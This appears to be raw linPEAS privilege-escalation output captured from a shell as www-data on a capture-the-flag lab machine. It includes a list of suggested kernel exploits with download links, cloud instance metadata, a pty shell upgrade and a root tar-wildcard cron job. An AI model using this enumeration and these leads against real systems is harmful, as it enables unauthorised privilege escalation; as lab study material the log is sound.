   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0ca4a09497c5052c4
instance-action: none
instance-id: i-01db65ca72c1ed35e
instance-life-cycle: on-demand
instance-type: t2.nano
region: eu-west-1

══╣ Account Info
{
  "Code" : "Success",
  "LastUpdated" : "2023-03-14T16:57:07Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:09:c7:bb:bf:13/
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role


══╣ User Data


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.3  0.8  37852  4440 ?        Ss   09:22   0:07 /sbin/init noprompt
root       199  0.0  0.4  27704  2452 ?        Ss   09:22   0:01 /lib/systemd/systemd-journald
root       263  0.0  0.5  44576  2876 ?        Ss   09:22   0:01 /lib/systemd/systemd-udevd
systemd+   307  0.0  0.4 100324  2324 ?        Ssl  09:22   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       517  0.0  0.3  16124  1660 ?        Ss   09:22   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       560  0.0  0.5 275860  2696 ?        Ssl  09:23   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       565  0.0  0.4  29008  2320 ?        Ss   09:23   0:00 /usr/sbin/cron -f
root       570  0.0  0.1  20096   792 ?        Ss   09:23   0:00 /lib/systemd/systemd-logind
message+   572  0.0  0.6  42896  3116 ?        Ss   09:23   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
syslog     588  0.0  0.4 256392  2396 ?        Ssl  09:23   0:00 /usr/sbin/rsyslogd -n
root       632  0.0  0.3  15752  1792 ttyS0    Ss+  09:23   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root       633  0.0  0.3  15936  1516 tty1     Ss+  09:23   0:00 /sbin/agetty --noclear tty1 linux
mysql      676  1.1 37.8 1136096 188576 ?      Ssl  09:23   0:27 /usr/sbin/mysqld
root       683  0.0  1.1  65512  5484 ?        Ss   09:23   0:00 /usr/sbin/sshd -D
root       713  0.1  4.8 303048 24316 ?        Ss   09:23   0:03 /usr/sbin/apache2 -k start
www-data   949 15.3  2.7 303552 13940 ?        S    09:28   5:07  _ /usr/sbin/apache2 -k start
www-data  1880  0.0  2.6 303528 13116 ?        S    09:41   0:00  _ /usr/sbin/apache2 -k start
www-data  1918  0.0  2.6 303528 12948 ?        S    09:41   0:00  _ /usr/sbin/apache2 -k start
www-data  1924  0.0  2.7 303764 13892 ?        S    09:41   0:00  _ /usr/sbin/apache2 -k start
www-data  1925  0.0  2.6 303724 13160 ?        S    09:41   0:00  _ /usr/sbin/apache2 -k start
www-data  1929  0.0  2.8 303752 14348 ?        S    09:41   0:00  _ /usr/sbin/apache2 -k start
www-data  1970  0.0  2.5 303528 12892 ?        S    09:41   0:00  _ /usr/sbin/apache2 -k start
www-data  1980 15.6  2.6 303940 13408 ?        R    09:41   3:08  _ /usr/sbin/apache2 -k start
www-data  6567  0.0  0.1   4504   748 ?        S    09:56   0:00  |   _ sh -c sh
www-data  6568  0.0  0.1   4504   692 ?        S    09:56   0:00  |       _ sh
www-data  6569  0.1  1.7  35840  8484 ?        S    09:56   0:00  |           _ python3 -c import pty;pty.spawn("/bin/bash")
www-data  6570  0.0  0.6  18212  3352 pts/0    Ss   09:56   0:00  |               _ /bin/bash
www-data  6574  0.4  0.4   5200  2396 pts/0    S+   09:56   0:01  |                   _ /bin/sh ./linpeas.sh
www-data 10798  0.0  0.1   5200   848 pts/0    S+   10:02   0:00  |                       _ /bin/sh ./linpeas.sh
www-data 10802  0.0  0.5  34556  2980 pts/0    R+   10:02   0:00  |                       |   _ ps fauxwww
www-data 10801  0.0  0.1   5200   848 pts/0    S+   10:02   0:00  |                       _ /bin/sh ./linpeas.sh
www-data  1981  0.0  2.6 303700 13196 ?        S    09:41   0:00  _ /usr/sbin/apache2 -k start
www-data  2011  0.0  2.7 303712 13940 ?        S    09:41   0:00  _ /usr/sbin/apache2 -k start
root       733  0.0  4.1 266376 20784 ?        Ss   09:23   0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
www-data   748  0.0  0.8 266376  4176 ?        S    09:23   0:00  _ php-fpm: pool www
www-data   749  0.0  0.8 266376  4176 ?        S    09:23   0:00  _ php-fpm: pool www

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND     PID  TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     805 Feb  9  2020 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Feb  6  2020 .
drwxr-xr-x 89 root root 4096 Feb 13  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  670 Jun 22  2017 php
-rw-r--r--  1 root root  191 Feb  6  2020 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Feb  6  2020 .
drwxr-xr-x 89 root root 4096 Feb 13  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Jun 11  2018 apache2
-rwxr-xr-x  1 root root 1474 Oct  9  2018 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  435 Nov 17  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Feb  6  2020 .
drwxr-xr-x 89 root root 4096 Feb 13  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Feb  6  2020 .
drwxr-xr-x 89 root root 4096 Feb 13  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Feb  6  2020 .
drwxr-xr-x 89 root root 4096 Feb 13  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/mandre/backup && tar -zcf /tmp/andre_backup.tar.gz *

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
/lib/systemd/system/emergency.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT     LAST                         PASSED    UNIT                         ACTIVATES
Tue 2023-03-14 21:28:51 PDT  11h left Tue 2023-03-14 09:23:01 PDT  39min ago apt-daily.timer              apt-daily.service
Wed 2023-03-15 06:58:49 PDT  20h left Tue 2023-03-14 09:23:01 PDT  39min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2023-03-15 09:37:34 PDT  23h left Tue 2023-03-14 09:37:34 PDT  25min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a      n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/run/dbus/system_bus_socket
  └─(Read Write)
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/php/php7.0-fpm.sock
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                               PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 1 systemd         root             :1.0          init.scope                -          -                  
:1.1                               570 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
:1.11                            12989 busctl          www-data         :1.11         apache2.service           -          -                  
:1.2                               560 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
com.ubuntu.LanguageSelector          - -               -                (activatable) -                         -         
org.freedesktop.Accounts           560 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
org.freedesktop.DBus               572 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.hostname1            - -               -                (activatable) -                         -         
org.freedesktop.locale1              - -               -                (activatable) -                         -         
org.freedesktop.login1             570 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
org.freedesktop.network1             - -               -                (activatable) -                         -         
org.freedesktop.resolve1             - -               -                (activatable) -                         -         
org.freedesktop.systemd1             1 systemd         root             :1.0          init.scope                -          -                  
org.freedesktop.timedate1            - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
cmess
127.0.0.1	localhost
127.0.1.1	cmess	dev.cmess.thm
127.0.0.1	gilacms.com

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:09:c7:bb:bf:13  
          inet addr:10.10.105.35  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::9:c7ff:febb:bf13/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:64628 errors:0 dropped:0 overruns:0 frame:0
          TX packets:63262 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:4858546 (4.8 MB)  TX bytes:9400313 (9.4 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1619 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1619 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:156180 (156.1 KB)  TX bytes:156180 (156.1 KB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=33(www-data) gid=33(www-data) groups=33(www-data)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
andre:x:1000:1000:andre,,,:/home/andre:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(mandre) gid=1000(mandre) groups=1000(mandre)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=108(mysql) gid=117(mysql) groups=117(mysql)
uid=109(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 10:03:14 up 40 min,  0 users,  load average: 3.04, 2.51, 1.81
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
mandre    tty1         Sun Feb  9 11:02:51 2020 - down                      (00:01)     0.0.0.0
reboot   system boot  Sun Feb  9 11:02:38 2020 - Sun Feb  9 11:04:02 2020  (00:01)     0.0.0.0
mandre    tty1         Sun Feb  9 10:58:15 2020 - down                      (00:04)     0.0.0.0
reboot   system boot  Sun Feb  9 10:57:50 2020 - Sun Feb  9 11:02:24 2020  (00:04)     0.0.0.0
mandre    tty1         Thu Feb  6 18:18:33 2020 - crash                    (2+16:39)    0.0.0.0
reboot   system boot  Thu Feb  6 18:18:21 2020 - Sun Feb  9 11:02:24 2020 (2+16:44)    0.0.0.0
mandre    tty1         Thu Feb  6 18:01:42 2020 - crash                     (00:16)     0.0.0.0
reboot   system boot  Thu Feb  6 18:00:21 2020 - Sun Feb  9 11:02:24 2020 (2+17:02)    0.0.0.0

wtmp begins Thu Feb  6 18:00:21 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest
mandre            pts/0    10.0.0.20        Thu Feb 13 15:02:43 -0800 2020

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-5

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.29, for Linux (x86_64) using  EditLine wrapper


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 Feb  6  2020 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.18 (Ubuntu)
Server built:   2019-10-08T13:31:25
httpd Not Found

Nginx version: nginx Not Found

/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Feb  6  2020 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Feb  6  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Feb  6  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
<Directory "/var/www/html">
	AllowOverride All
</Directory>
	
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName dev.cmess.thm
	DocumentRoot /var/www/dev
	
</VirtualHost>


-rw-r--r-- 1 root root 1516 Feb  6  2020 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
<Directory "/var/www/html">
	AllowOverride All
</Directory>
	
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName dev.cmess.thm
	DocumentRoot /var/www/dev
	
</VirtualHost>
lrwxrwxrwx 1 root root 35 Feb  6  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
<Directory "/var/www/html">
	AllowOverride All
</Directory>
	
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName dev.cmess.thm
	DocumentRoot /var/www/dev
	
</VirtualHost>

-rw-r--r-- 1 root root 70999 Jan 14  2020 /etc/php/7.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70656 Jan 14  2020 /etc/php/7.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70999 Jan 14  2020 /etc/php/7.0/fpm/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 30  2013 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Feb  6  2020 /etc/ldap


╔══════════╣ Searching ssl/ssh files
Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config
AuthorizedKeysFile	.ssh/authorized_keys
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb  6  2020 /etc/pam.d
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd




╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb  6  2020 /usr/share/keyrings
drwxr-xr-x 2 root root 4096 Feb  6  2020 /var/lib/apt/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 12255 Feb 26  2019 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 18  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 18  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Nov  5  2017 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Nov  5  2017 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1227 May 18  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Feb 26  2019 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg


╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
-rwxrwxrwx 1 root root 639 Jul 10  2019 /var/www/html/Dockerfile


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)


-rw-r--r-- 1 root root 69 Jan 14  2020 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jan 14  2020 /usr/share/php7.0-common/common/ftp.ini






╔══════════╣ Analyzing Interesting logs Files (limit 70)

-rw-r--r-- 1 www-data www-data 948 Mar 14 09:41 /var/www/html/log/error.log

╔══════════╣ Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 20 Feb  6  2020 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Feb  6  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
